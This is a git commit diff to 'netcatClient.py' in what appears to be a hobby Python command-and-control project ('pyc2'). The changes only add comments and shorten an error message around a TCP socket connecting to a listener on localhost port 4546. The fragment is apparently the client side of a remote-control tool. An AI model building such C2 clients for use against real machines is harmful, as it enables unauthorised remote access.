42255f9e2aafe7e8070b51e0372dbc3f92e14b13
MaxBleakley <146343366+MaxBleakley@users.noreply.github.com>
2026-06-30 01:21:17 +0100

    Deleted protocol.py as it is no longer needed. Updated netcatClient.py to include more detailed comments.

--- pyc2/netcatClient.py
+++ pyc2/netcatClient.py
@@ -10,9 +10,12 @@ from win32com.shell import shell
 host="127.0.0.1" # ip of the listening server we wish to connect to
 port=4546 # port for the listening server we wish to connect to
     
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #IPV4 TCP/IP networking
+
+    # socket.AF_INET = create an IPV4 socket
+    # socket.SOCK_STREAM = create a TCP socket
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creates a IPV4 TCP/IP networking
 try:
     client.connect((host, port)) #connect over to our server!
 except:
-    print("server/socket must have died...time to hop off") #self-explanatory
+    print("server/socket must have died...") #self-explanatory
     os._exit(0)
